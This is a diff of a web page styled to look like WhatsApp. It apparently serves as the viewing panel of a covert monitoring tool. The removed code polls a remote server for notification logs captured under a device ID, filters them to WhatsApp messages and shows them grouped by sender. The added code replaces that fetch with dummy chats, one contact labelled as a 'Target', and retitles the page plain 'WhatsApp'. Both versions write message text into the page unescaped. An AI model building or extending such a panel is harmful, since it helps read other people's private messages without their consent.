@@ -3,56 +3,99 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>WhatsApp Monitor</title>
+    <title>WhatsApp</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* --- WHATSAPP DARK THEME --- */
+        /* --- WHATSAPP DARK THEME CSS --- */
         body { 
-            margin: 0; background-color: #111b21; font-family: Helvetica, Arial, sans-serif; 
-            color: #e9edef; height: 100vh; overflow: hidden; display: flex; justify-content: center;
-        }
-        .app-container {
-            width: 100%; height: 100%; max-width: 450px; background-color: #111b21;
-            position: relative; box-shadow: 0 0 20px rgba(0,0,0,0.5); display: flex; flex-direction: column;
+            margin: 0; 
+            background-color: #111b21; 
+            font-family: Helvetica, Arial, sans-serif; 
+            color: #e9edef; 
+            height: 100vh; 
+            overflow: hidden; 
+            display: flex;
+            justify-content: center; /* Desktop par center rakhne ke liye */
         }
 
-        /* CONTACT LIST */
+        /* Container to manage view on Desktop */
+        .app-container {
+            width: 100%;
+            height: 100%;
+            max-width: 450px; /* Desktop par mobile view maintain karne ke liye */
+            background-color: #111b21;
+            position: relative;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* --- VIEW 1: CONTACT LIST STYLE --- */
         #contactListView { display: flex; flex-direction: column; height: 100%; width: 100%; }
+        
         .main-header {
-            padding: 10px 15px; display: flex; justify-content: space-between; align-items: center;
-            background-color: #202c33; height: 40px; z-index: 5;
+            padding: 15px; display: flex; justify-content: space-between; align-items: center;
+            background-color: #202c33; border-bottom: 1px solid #2a3942; z-index: 5;
         }
         .app-title { font-size: 1.3rem; font-weight: bold; color: #8696a0; }
         .top-icons { display: flex; gap: 20px; color: #aebac1; font-size: 1.1rem; }
+
         .contact-list { flex: 1; overflow-y: auto; }
-        .contact-item { display: flex; align-items: center; padding: 12px 15px; cursor: pointer; border-bottom: 1px solid #202c33; }
+        
+        .contact-item {
+            display: flex; align-items: center; padding: 12px 15px; cursor: pointer;
+            transition: 0.2s;
+        }
         .contact-item:active { background: #202c33; }
-        .dp-circle { width: 45px; height: 45px; border-radius: 50%; background: #667781; display: flex; justify-content: center; align-items: center; margin-right: 15px; color: #fff; font-size: 1.2rem; }
-        .contact-info { flex: 1; }
+        
+        .dp-circle { width: 45px; height: 45px; border-radius: 50%; background: #667781; display: flex; justify-content: center; align-items: center; margin-right: 15px; overflow: hidden; color: #fff; font-size: 1.2rem; }
+        .dp-circle img { width: 100%; height: 100%; object-fit: cover; }
+        
+        .contact-info { flex: 1; border-bottom: 1px solid #202c33; padding-bottom: 12px; }
         .row-top { display: flex; justify-content: space-between; margin-bottom: 4px; }
         .name { font-size: 1rem; font-weight: 500; color: #e9edef; }
         .time { font-size: 0.75rem; color: #8696a0; }
         .last-msg { font-size: 0.85rem; color: #8696a0; display: -webkit-box; -webkit-line-clamp: 1; -webkit-box-orient: vertical; overflow: hidden; }
 
-        /* CHAT DETAIL */
-        #chatDetailView { display: none; flex-direction: column; height: 100%; position: absolute; top: 0; left: 0; width: 100%; background: #0b141a; z-index: 10; }
-        .chat-header { background-color: #202c33; padding: 5px 10px; display: flex; align-items: center; gap: 10px; height: 50px; }
-        .back-arrow { font-size: 1.2rem; color: #aebac1; padding: 8px; cursor: pointer; }
-        .chat-area { 
-            flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column;
+        /* --- VIEW 2: CHAT CONVERSATION STYLE (Hidden Initially) --- */
+        #chatDetailView { 
+            display: none; /* Initially Hidden */
+            flex-direction: column; height: 100%; 
+            position: absolute; top: 0; left: 0; width: 100%; background: #0b141a; z-index: 10;
+        }
+
+        .chat-header {
+            background-color: #202c33; padding: 10px 10px; display: flex; align-items: center; gap: 10px; border-bottom: 1px solid #2a3942;
+        }
+        .back-arrow { font-size: 1.2rem; color: #aebac1; padding: 8px; cursor: pointer; border-radius: 50%; }
+        .back-arrow:active { background-color: rgba(255,255,255,0.1); }
+        
+        .chat-area {
+            flex: 1; padding: 15px; overflow-y: auto;
+            /* WhatsApp Dark Background Pattern */
             background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png');
             background-size: 400px; background-color: #0b141a; 
         }
-        .message { max-width: 75%; margin-bottom: 5px; padding: 6px 10px 8px 9px; border-radius: 8px; font-size: 0.9rem; position: relative; line-height: 1.3; word-wrap: break-word; }
-        .msg-left { background-color: #202c33; align-self: flex-start; border-top-left-radius: 0; }
-        .msg-time { font-size: 0.65rem; color: #aebac1; float: right; margin-top: 5px; margin-left: 8px; }
+
+        .message { max-width: 75%; margin-bottom: 8px; padding: 6px 10px 8px 9px; border-radius: 8px; font-size: 0.9rem; position: relative; clear: both; line-height: 1.3; }
+        
+        .msg-left { background-color: #202c33; float: left; border-top-left-radius: 0; }
+        .msg-right { background-color: #005c4b; float: right; border-top-right-radius: 0; margin-left: auto; }
+        
+        .msg-time { font-size: 0.65rem; color: #aebac1; float: right; margin-top: 5px; margin-left: 8px; display: flex; align-items: center; gap: 3px; }
+
         .chat-footer { background-color: #202c33; padding: 8px 10px; display: flex; align-items: center; gap: 10px; }
-        .real-input { flex: 1; background: #2a3942; border: none; padding: 10px 15px; border-radius: 20px; color: #d1d7db; font-size: 0.95rem; outline: none; }
+        .fake-input { flex: 1; background: #2a3942; padding: 10px 15px; border-radius: 20px; color: #8696a0; font-size: 0.95rem; }
+
+        /* Scrollbar styling */
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-thumb { background: #374045; border-radius: 2px; }
     </style>
 </head>
 <body>
 
     <div class="app-container">
+        
         <div id="contactListView">
             <div class="main-header">
                 <span class="app-title">WhatsApp</span>
@@ -62,193 +105,164 @@
                     <i class="fa-solid fa-ellipsis-vertical"></i>
                 </div>
             </div>
+            
             <div class="contact-list" id="contactsContainer">
-                <p style="text-align:center; padding:20px; color:#8696a0;">Waiting for data...</p>
-            </div>
+                </div>
         </div>
 
         <div id="chatDetailView">
             <div class="chat-header">
                 <i class="fa-solid fa-arrow-left back-arrow" onclick="closeChat()"></i>
-                <div class="dp-circle" style="width: 35px; height: 35px; margin: 0 5px 0 0;"><i class="fa-solid fa-user"></i></div>
+                <div class="dp-circle" style="width: 35px; height: 35px; margin-right: 10px;">
+                    <i class="fa-solid fa-user"></i>
+                </div>
                 <div style="flex: 1;">
                     <h3 id="headerName" style="margin:0; font-size: 1rem; font-weight: 500;">User</h3>
+                    <p style="margin:0; font-size: 0.75rem; color: #aebac1;">Online</p>
                 </div>
                 <i class="fa-solid fa-video" style="color: #aebac1; margin-right: 20px;"></i>
                 <i class="fa-solid fa-phone" style="color: #aebac1; margin-right: 15px;"></i>
                 <i class="fa-solid fa-ellipsis-vertical" style="color: #aebac1;"></i>
             </div>
-            <div class="chat-area" id="messagesContainer"></div>
+
+            <div class="chat-area" id="messagesContainer">
+                </div>
+
             <div class="chat-footer">
                 <i class="fa-solid fa-plus" style="color: #8696a0; font-size: 1.2rem;"></i>
-                <input type="text" class="real-input" placeholder="Message" readonly>
+                <div class="fake-input">Message</div>
                 <i class="fa-solid fa-microphone" style="color: #8696a0; font-size: 1.2rem;"></i>
             </div>
         </div>
+
     </div>
 
     <script>
-        // --- CONFIG ---
-        const SERVER_URL = "https://child-v9no.onrender.com"; // Tumhara URL
-        
-        // URL se ID nikalo
-        const urlParams = new URLSearchParams(window.location.search);
-        const urlID = urlParams.get('id');
-        if (urlID) {
-            localStorage.setItem('monitoring_id', urlID);
-            const newUrl = window.location.protocol + "//" + window.location.host + window.location.pathname;
-            window.history.replaceState({path: newUrl}, '', newUrl);
-        }
+        // --- MULTI-USER ID LOGIC ---
 
+        // 1. Dashboard se set ki hui ID uthao
         const DEVICE_ID = localStorage.getItem('monitoring_id');
-        let groupedChats = {};
 
-        // --- FETCH DATA ---
-        async function fetchWhatsAppMessages() {
-            if(!DEVICE_ID) return;
-            try {
-                // Hum notification aur chat_logs dono check karenge
-                const response = await fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/notifications`);
-                const rawData = await response.json();
-                processData(rawData);
-            } catch (error) {
-                console.log("Waiting for connection...");
-            }
+        // Security: Agar bina ID ke khola to wapas bhejo
+        if (!DEVICE_ID) {
+            alert("No Device ID Found. Redirecting to Dashboard...");
+            window.location.href = 'index.html'; // Yahan apni main file ka naam check kar lena
         }
 
-        // --- DATA PROCESSING (CLEANING GARBAGE) ---
-        function processData(data) {
-            if (!data || data.length === 0) return;
-            groupedChats = {};
+        // 2. Us ID ke liye unique storage key banao
+        const STORAGE_KEY = `whatsapp_data_${DEVICE_ID}`;
 
-            data.forEach(log => {
-                // 1. App Filter: Sirf WhatsApp
-                let appName = (log.app || "").toLowerCase();
-                let title = log.title || "Unknown";
-                let msgText = log.text || "";
-                
-                // Agar title ya text me WhatsApp likha ho, ya package name ho
-                if (appName.includes("whatsapp") || title === "WhatsApp") {
-                    
-                    // --- 2. JUNK FILTER (Faltu cheezein hatana) ---
-                    if (msgText.includes(".apk") ||         // APK Files
-                        msgText.includes("MB") ||           // File Sizes
-                        msgText.includes("unread messages") || // System Notifs
-                        msgText.includes("Checking for new") ||
-                        msgText.trim() === ""               // Empty messages
-                    ) {
-                        return; // Skip this loop
-                    }
+        // 3. LocalStorage se Data Load karo
+        let storedData = localStorage.getItem(STORAGE_KEY);
+        let allChats = [];
 
-                    // --- 3. CLEANING TEXT ---
-                    // "Hello16:17" jese text ko fix karna
-                    // (Ye regex check karega agar end me time chipka hai)
-                    msgText = msgText.replace(/\d{1,2}:\d{2}$/, '').trim();
-
-                    // Agar sender ka naam hi msg ban gaya ho (Common bug)
-                    if (title === "WhatsApp") {
-                         // Koshish karo content se naam nikalne ki, nahi to "Unknown"
-                         if(msgText.includes(":")) {
-                             let parts = msgText.split(":");
-                             title = parts[0].trim();
-                             msgText = parts.slice(1).join(":").trim();
-                         } else {
-                             title = "Unknown Sender";
-                         }
-                    }
-
-                    // Grouping
-                    if (!groupedChats[title]) {
-                        groupedChats[title] = { name: title, msgs: [], lastTime: 0 };
-                    }
-
-                    let timestamp = log.timestamp || Date.now();
-                    
-                    groupedChats[title].msgs.push({
-                        text: msgText,
-                        time: timestamp
-                    });
-
-                    // Update latest time
-                    if (timestamp > groupedChats[title].lastTime) {
-                        groupedChats[title].lastTime = timestamp;
-                    }
+        if (storedData) {
+            allChats = JSON.parse(storedData);
+        } else {
+            // --- DUMMY DATA FOR TESTING (Agar naya ID hai) ---
+            console.log(`New Device ID: ${DEVICE_ID}. Creating dummy data.`);
+            allChats = [
+                {
+                    id: 1, name: "Papa", time: "10:30 AM", lastMsg: "Ghar aaja",
+                    messages: [
+                        { side: 'right', text: 'Mai coaching me hu', time: '10:00 AM' },
+                        { side: 'left', text: 'Ghar aaja urgent hai', time: '10:30 AM' }
+                    ]
+                },
+                {
+                    id: 2, name: "Rahul (Target: " + DEVICE_ID + ")", // ID dikhegi taaki confirm ho
+                    time: "Yesterday", lastMsg: "Notes bhej",
+                    messages: [
+                        { side: 'left', text: 'Bhai physics ke notes bhej de', time: '9:00 PM' },
+                        { side: 'right', text: 'Ruk abhi bhejta hu', time: '9:05 PM' }
+                    ]
+                },
+                {
+                    id: 3, name: "Unknown", time: "Yesterday", lastMsg: "Call me",
+                    messages: [
+                        { side: 'left', text: 'Call me back', time: '8:00 PM' }
+                    ]
                 }
-            });
-
-            renderContactList();
+            ];
+            // Save dummy data so next time it persists
+            localStorage.setItem(STORAGE_KEY, JSON.stringify(allChats));
         }
 
-        // --- RENDER LIST ---
-        function renderContactList() {
-            const container = document.getElementById('contactsContainer');
-            container.innerHTML = "";
-            
-            // Sort contacts by latest message time
-            const sortedContacts = Object.values(groupedChats).sort((a, b) => b.lastTime - a.lastTime);
+        // --- UI RENDER LOGIC ---
 
-            if (sortedContacts.length === 0) {
-                 container.innerHTML = "<p style='text-align:center; padding:20px; color:#8696a0;'>No readable chats found.</p>";
-                 return;
+        const contactListDiv = document.getElementById('contactsContainer');
+        const chatViewDiv = document.getElementById('chatDetailView');
+        const listViewDiv = document.getElementById('contactListView');
+        const msgsDiv = document.getElementById('messagesContainer');
+        const headerName = document.getElementById('headerName');
+
+        // Function 1: List ko screen par dikhana
+        function renderContactList() {
+            contactListDiv.innerHTML = "";
+            
+            if (allChats.length === 0) {
+                contactListDiv.innerHTML = "<p style='text-align:center; padding:20px; color:#888'>No chats available</p>";
+                return;
             }
 
-            sortedContacts.forEach(chat => {
-                let date = new Date(chat.lastTime);
-                let timeString = date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', hour12: true });
-                let lastMsg = chat.msgs[0] ? chat.msgs[0].text : ""; // First processed msg
-
-                container.innerHTML += `
-                    <div class="contact-item" onclick="openChat('${chat.name}')">
+            allChats.forEach(contact => {
+                contactListDiv.innerHTML += `
+                    <div class="contact-item" onclick="openChat(${contact.id})">
                         <div class="dp-circle"><i class="fa-solid fa-user"></i></div>
                         <div class="contact-info">
                             <div class="row-top">
-                                <span class="name">${chat.name}</span>
-                                <span class="time">${timeString}</span>
+                                <span class="name">${contact.name}</span>
+                                <span class="time">${contact.time}</span>
                             </div>
-                            <div class="last-msg">${lastMsg}</div>
+                            <div class="last-msg">${contact.lastMsg}</div>
                         </div>
                     </div>
                 `;
             });
         }
 
-        // --- OPEN CHAT ---
-        function openChat(name) {
-            const chat = groupedChats[name];
-            if (!chat) return;
+        // Function 2: Chat open karna (Click par)
+        function openChat(id) {
+            // ID match karke sahi user dhundo
+            const contact = allChats.find(c => c.id === id);
+            
+            if(contact) {
+                // Header naam set karo
+                headerName.innerText = contact.name;
+                
+                // Messages ka dabba saaf karo
+                msgsDiv.innerHTML = "";
+                
+                // Messages bharo
+                contact.messages.forEach(msg => {
+                    let msgClass = msg.side === 'right' ? 'msg-right' : 'msg-left';
+                    let tick = msg.side === 'right' ? '<i class="fa-solid fa-check-double" style="color:#53bdeb; margin-left:3px;"></i>' : '';
+                    
+                    msgsDiv.innerHTML += `
+                        <div class="message ${msgClass}">
+                            ${msg.text}
+                            <span class="msg-time">${msg.time} ${tick}</span>
+                        </div>
+                    `;
+                });
 
-            document.getElementById('headerName').innerText = chat.name;
-            const msgContainer = document.getElementById('messagesContainer');
-            msgContainer.innerHTML = "";
-
-            // Oldest message first
-            const sortedMsgs = chat.msgs.sort((a, b) => a.time - b.time);
-
-            sortedMsgs.forEach(m => {
-                let date = new Date(m.time);
-                let timeStr = date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', hour12: true });
-
-                msgContainer.innerHTML += `
-                    <div class="message msg-left">
-                        ${m.text}
-                        <span class="msg-time">${timeStr}</span>
-                    </div>
-                `;
-            });
-
-            document.getElementById('contactListView').style.display = 'none';
-            document.getElementById('chatDetailView').style.display = 'flex';
-            msgContainer.scrollTop = msgContainer.scrollHeight;
+                // Views switch karo (List chupaao, Chat dikhao)
+                listViewDiv.style.display = 'none';
+                chatViewDiv.style.display = 'flex';
+                
+                // Scroll to bottom automatic
+                msgsDiv.scrollTop = msgsDiv.scrollHeight;
+            }
         }
 
+        // Function 3: Back button (Chat band karna)
         function closeChat() {
-            document.getElementById('chatDetailView').style.display = 'none';
-            document.getElementById('contactListView').style.display = 'flex';
+            chatViewDiv.style.display = 'none';
+            listViewDiv.style.display = 'flex';
         }
 
-        // Refresh loop
-        fetchWhatsAppMessages();
-        setInterval(fetchWhatsAppMessages, 5000);
+        // App start hone par list dikhao
+        renderContactList();
 
     </script>
 </body>
